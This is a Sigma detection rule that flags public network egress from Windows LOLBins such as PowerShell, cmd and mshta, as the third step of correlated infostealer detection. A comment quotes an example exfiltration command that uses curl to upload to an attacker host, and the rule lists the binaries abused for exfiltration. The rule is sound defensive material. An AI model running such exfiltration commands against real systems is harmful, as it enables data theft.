title: Infostealer suspicious public network egress from LOLBins (step 3 of 3)
id: 9ddb6120-1dd5-4bc4-9a3e-bebe5a1afc52
status: experimental
description: >
  Step 3 of correlated infostealer detection: public egress from common LOLBins or loaders.
  Correlate with step 1 (execution) and step 2 (credential-store access) within a short
  time window (<=10 minutes). IPv6 private ranges (::1, fe80::, fc00::/7) and IPv4
  link-local (169.254.) are filtered in addition to RFC1918 ranges.
references:
  - https://www.dexpose.io/deep-dive-into-arkanix-stealer-and-its-infrastructure/
  - https://attack.mitre.org/techniques/T1071/001/
  - https://attack.mitre.org/techniques/T1041/
author: Adama ASSIONGBON (SOC & CTI Consultant), https://linkedin.com/in/adama-assiongbon-9029893a
date: 2026-01-06
modified: 2026-06-22
related:
  - id: 26090645-90c0-40ee-9aa9-5d0037b33ae7
    type: similar
  - id: 12caf5be-99d5-432d-b049-ba9263962835
    type: similar
  - id: 50f27880-01d7-42b2-9368-0939504fa162
    type: similar
tags:
  - attack.exfiltration
  - attack.t1041
  - attack.command-and-control
  - attack.t1071.001
logsource:
  product: windows
  category: network_connection

detection:
  selection_lolbins:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
      # BLIND SPOT FIX 2026-06-22 (second pass): cmd.exe was absent. An infostealer using
      # `cmd.exe /c curl https://attacker.com/upload` for exfiltration would evade this rule.
      - '\cmd.exe'
      - '\rundll32.exe'
      - '\mshta.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\regsvr32.exe'

  filter_private_ranges:
    DestinationIp|startswith:
      - '10.'
      - '192.168.'
      - '127.'
      - '172.16.'
      - '172.17.'
      - '172.18.'
      - '172.19.'
      - '172.20.'
      - '172.21.'
      - '172.22.'
      - '172.23.'
      - '172.24.'
      - '172.25.'
      - '172.26.'
      - '172.27.'
      - '172.28.'
      - '172.29.'
      - '172.30.'
      - '172.31.'
      - '169.254.'
      - '::1'
      - 'fe80:'
      - 'fc00:'
      - 'fd00:'

  condition: selection_lolbins and not filter_private_ranges

fields:
  - UtcTime
  - Computer
  - User
  - Image
  - CommandLine
  - DestinationIp
  - DestinationPort
  - ProcessId

falsepositives:
  - Legitimate automation reaching public endpoints (validate destination, signer, ticket)

level: high
